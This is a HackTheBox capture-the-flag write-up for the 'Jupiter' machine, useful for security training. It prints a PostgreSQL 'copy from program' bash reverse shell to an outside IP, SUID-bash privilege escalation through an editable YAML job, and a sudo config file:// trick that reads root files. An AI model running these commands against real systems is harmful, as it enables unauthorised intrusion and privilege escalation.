# [Jupiter](https://app.hackthebox.com/machines/Jupiter) - 29/08/2023 - HackTheBox write-up

IP:   10.10.11.216
Name: `jupiter.htb`

## User flag

### Discovery

There is a web and a SSH server. After enumeration we can find the other interesting web server running under `kiosk.jupiter.htb`. By looking at queries in BurpSuite, we can find many POST requests to `/api/ds/query` with a `rawSql` parameter.

### Searching for vulnerability

We can just use this parameter to execute any SQL query we want. The database is a PostgreSQL instance, and we have access to the `pg_shadow` table where we find this hash:
```
User : grafana_viewer
Hash : SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=
```

But it's uncrackable...

### Exploitation

After tests we have high privileges in the database and we can read files and execute commands, so we can start a reverse shell with this request:
```
drop table if exists cmd_exec;
create table cmd_exec(cmd_output text);
copy cmd_exec from program '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.47/56384 0>&1"';
select * from cmd_exec;
```

Now we have a shell access to the `postgres` user.

### Searching for vulnerability

There is two users, `juno` and `jovian`. We need to find a way to priv esc to one of them first.

With `pspy64` we can find a process running by `juno` every few minutes, using a file `network-simulation.yml`, in `/dev/shm`. This directory is world-writeable so it could be interesting. The file is editable and contains the following:
```yaml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

### Exploitation

We can now replace the path and args parameters to run any commands we want. I've tried first to start a second reverse shell in Python, but it won't work, and finally, copy the `bash` file in `/tmp` and then add the SUID bit with `chmod`, like this:
```
hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/file
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/file
      start_time: 5s
```

We just need to wait for the job to finish and next run `/tmp/file -p`. We obtain a basic shell as `juno`, we can add our SSH keys for the next step, and get the flag !

## Root flag

User `jovian` is part of `sudo` group so we might need to do lateral movement first.

In `/opt` there is a folder with a service and logs. It's a jupyter notebook running on localhost, port 8888. With `chisel` we can forward traffic and access the notebook.

We need a token to authenticate, and we can found it in the logs. Then, we have access to the jupyter notebook and execute Python code as `jovian`. So, basically we run another reverse shell, and add our SSH key.

### Searching for elevating privileges

Now we are `jovian`, and by running `sudo -l` we see that we can run `/usr/local/bin/sattrack`. The program needs a configuration file that we can build step by steps, with the program error. But, after a few time at doing reverse engineering and tests, I found the complete file in `/usr/local/share/sattrack/config.json`:
```json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```

The file is read and then the resources files are stored in `/tmp/tle`.

### Exploitation

To exploit this, is very simple we just need to add `file:///root/root.txt` as a `tlesources`, and run the command with sudo.

Then we will find the flag in `/tmp/tle/root.txt`.
